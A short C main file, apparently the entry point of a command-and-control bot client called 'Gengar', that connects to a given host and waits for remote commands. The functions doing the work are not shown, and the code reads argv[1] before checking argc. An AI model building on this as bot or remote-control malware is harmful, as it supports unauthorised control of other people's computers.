#include <stdlib.h>
#include "commander.h"
#include "cnc.h"
#include "logger.h"

int main(int argc, char *argv[])
{
    char *host = argv[1];

    if (argc != 2)
    {
        fprintf(stderr, "usage: %s HOST", argv[0]);
        exit(EXIT_FAILURE);
    }

    log_info("Gengar started.");
    connect_to_cnc(host);
    listen_for_cmds();
}